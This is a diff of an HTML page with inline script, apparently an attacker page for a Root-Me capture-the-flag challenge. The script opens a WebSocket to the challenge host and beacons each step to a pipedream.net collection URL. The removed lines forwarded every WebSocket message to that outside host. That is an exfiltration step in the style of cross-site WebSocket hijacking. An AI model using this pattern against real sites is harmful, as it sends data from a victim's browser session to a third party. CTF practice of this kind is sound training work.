@@ -2,14 +2,22 @@
 <html>
 <body>
 <script>
-fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded_bis", { mode: "no-cors" });
+fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=page_loaded", { mode: "no-cors" });
+
+fetch("https://eo287p1od7gtso3.m.pipedream.net/?typeof_ws=" + encodeURIComponent(typeof WebSocket), {
+  mode: "no-cors"
+});
 
 try {
-  const ws = new WebSocket("ws://ctf20.root-me.org/ws");
+  const target = "ws://ctf20.root-me.org/ws";
+  fetch("https://eo287p1od7gtso3.m.pipedream.net/?target=" + encodeURIComponent(target), {
+    mode: "no-cors"
+  });
+
+  const ws = new WebSocket(target);
 
   ws.onopen = () => {
     fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_open", { mode: "no-cors" });
-    ws.send("help");
   };
 
   ws.onerror = () => {
@@ -19,16 +27,12 @@ try {
   ws.onclose = () => {
     fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_close", { mode: "no-cors" });
   };
-
-  ws.onmessage = (e) => {
-    fetch("https://eo287p1od7gtso3.m.pipedream.net/?msg=" + encodeURIComponent(e.data), {
-      mode: "no-cors"
-    });
-  };
 } catch (e) {
-  fetch("https://eo287p1od7gtso3.m.pipedream.net/?step=ws_ctor_exception", {
-    mode: "no-cors"
-  });
+  fetch(
+    "https://eo287p1od7gtso3.m.pipedream.net/?step=ws_ctor_exception&msg=" +
+      encodeURIComponent(String(e && e.message ? e.message : e)),
+    { mode: "no-cors" }
+  );
 }
 </script>
 OK
